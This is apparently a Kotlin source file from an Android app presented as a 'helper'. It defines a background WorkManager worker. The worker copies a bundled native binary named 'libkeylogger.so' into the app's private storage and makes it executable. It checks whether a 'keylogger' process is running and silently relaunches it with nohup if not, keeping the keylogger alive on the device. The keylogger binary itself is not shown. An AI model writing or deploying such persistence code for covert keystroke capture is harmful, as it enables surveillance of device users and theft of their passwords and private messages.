package com.jack.helper

import android.content.Context
import android.util.Log
import androidx.work.Worker
import androidx.work.WorkerParameters
import java.io.BufferedReader
import java.io.File
import java.io.InputStreamReader

class WatcherWorker(context: Context, workerParams: WorkerParameters) : Worker(context, workerParams) {

    override fun doWork(): Result {
        Log.d("FoxHelper", "WatcherWorker running...")
        
        // The name of the binary as packaged in the lib/ directory (usually prefixed with lib and suffixed with .so)
        // Even if it's an executable, Android's build system expects it to look like a shared library to package it.
        val packagedBinaryName = "libkeylogger.so" 
        val executableName = "keylogger"
        
        val nativeLibraryDir = applicationContext.applicationInfo.nativeLibraryDir
        val sourceFile = File(nativeLibraryDir, packagedBinaryName)
        val targetFile = File(applicationContext.filesDir, executableName)

        // 1. Copy the binary to internal storage if it doesn't exist or if we need to update it
        if (!targetFile.exists() && sourceFile.exists()) {
            try {
                Log.d("FoxHelper", "Copying binary from $sourceFile to $targetFile")
                sourceFile.copyTo(targetFile, overwrite = true)
                // 2. Ensure it's executable
                targetFile.setExecutable(true)
            } catch (e: Exception) {
                Log.e("FoxHelper", "Failed to copy or set executable: ${e.message}")
                return Result.failure()
            }
        } else if (!sourceFile.exists() && !targetFile.exists()) {
             Log.e("FoxHelper", "Binary not found in nativeLibraryDir: $sourceFile")
             return Result.failure()
        }

        // 3. Check if running and restart
        if (!isProcessRunning(executableName)) {
            Log.d("FoxHelper", "Process $executableName is NOT running. Attempting to restart...")
            startProcess(targetFile.absolutePath)
        } else {
            Log.d("FoxHelper", "Process $executableName is already running.")
        }

        return Result.success()
    }

    private fun isProcessRunning(processName: String): Boolean {
        try {
            val process = Runtime.getRuntime().exec("ps -A")
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            var line: String?
            while (reader.readLine().also { line = it } != null) {
                // Check if the line contains our executable name and is running under our UID
                if (line?.contains(processName) == true) {
                    return true
                }
            }
            process.waitFor()
        } catch (e: Exception) {
            Log.e("FoxHelper", "Error checking process: ${e.message}")
        }
        return false
    }

    private fun startProcess(path: String) {
        try {
            // Execute the binary from the app's internal storage
            Runtime.getRuntime().exec(arrayOf("sh", "-c", "nohup $path > /dev/null 2>&1 &"))
            Log.d("FoxHelper", "Executed restart command for $path")
        } catch (e: Exception) {
            Log.e("FoxHelper", "Failed to start process: ${e.message}")
        }
    }
}